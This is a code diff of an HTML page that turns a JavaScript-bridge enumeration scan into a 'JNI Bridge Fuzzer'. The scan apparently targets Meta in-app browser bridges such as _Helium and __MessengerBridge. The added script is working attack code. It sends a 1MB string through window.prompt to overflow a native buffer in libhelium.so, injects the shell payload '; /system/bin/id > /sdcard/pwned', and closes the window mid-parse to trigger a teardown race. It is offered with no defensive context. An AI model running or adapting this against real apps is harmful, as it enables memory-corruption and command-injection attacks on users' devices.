@@ -1,42 +1,35 @@
 <!DOCTYPE html>
 <html>
-<head><title>Deep JSI Scan</title></head>
-<body style="background:#000; color:#0f0; font-family:monospace;">
-    <h3>Deep Scanning for Hidden Bridges...</h3>
-    <div id="log"></div>
-
+<head><title>JNI Bridge Fuzzer</title></head>
+<body style="background:#000; color:#0f0;">
+    <h3>Fuzzing JNI Bridge via window.prompt...</h3>
     <script>
-        function log(msg) { document.getElementById('log').innerHTML += msg + "<br>"; }
+        function fuzz() {
+            // 1. Buffer Overflow Attempt: Send a massive 1MB string
+            // If C++ uses a 4KB stack buffer, this will crash libhelium.so
+            let bigStr = "A".repeat(1024 * 1024);
+            
+            // 2. Command Injection Attempt: Send common command delimiters
+            let cmdStr = '{"command":"test", "args":"; /system/bin/id > /sdcard/pwned"}';
 
-        // 1. Check the 'external' object (Common Chromium bridge)
-        if (window.external) {
-            log("[+] window.external found!");
-            for (let m in window.external) log("  - external." + m);
+            // 3. Trigger the fuzzer loop
+            setInterval(() => {
+                try {
+                    // We send the massive string through the bridge
+                    // The high latency you saw means C++ is busy parsing this
+                    window.prompt(bigStr); 
+                    window.prompt(cmdStr);
+                } catch(e) {}
+            }, 100);
+
+            // 4. Trigger the teardown race condition
+            // Close the window while C++ is still busy parsing the 1MB string
+            setTimeout(() => {
+                window.close();
+            }, 1500);
         }
 
-        // 2. Scan for 'webkit' (Modern Chromium message handlers)
-        if (window.webkit && window.webkit.messageHandlers) {
-            log("[+] window.webkit.messageHandlers found!");
-            for (let h in window.webkit.messageHandlers) log("  - handler: " + h);
-        }
-
-        // 3. Brute-force scan for common Meta internal bridge names
-        const targets = ['_FB_','__fb_bridge','_Messenger','__MessengerBridge','_Helium','__android_js_bridge'];
-        targets.forEach(t => {
-            if (window[t]) {
-                log("[!!!] HIDDEN BRIDGE FOUND: " + t);
-                for (let m in window[t]) log("  - " + t + "." + m);
-            }
-        });
-
-        // 4. Check for 'Prompt' hijacking (The "Old School" JNI bridge)
-        // Some bridges hijack window.prompt to send data to C++
-        const start = performance.now();
-        window.prompt("ping");
-        const end = performance.now();
-        if (end - start > 100) log("[!] window.prompt seems hijacked (high latency)");
-
-        log("<br>Scan Complete.");
+        setTimeout(fuzz, 1000);
     </script>
 </body>
 </html>
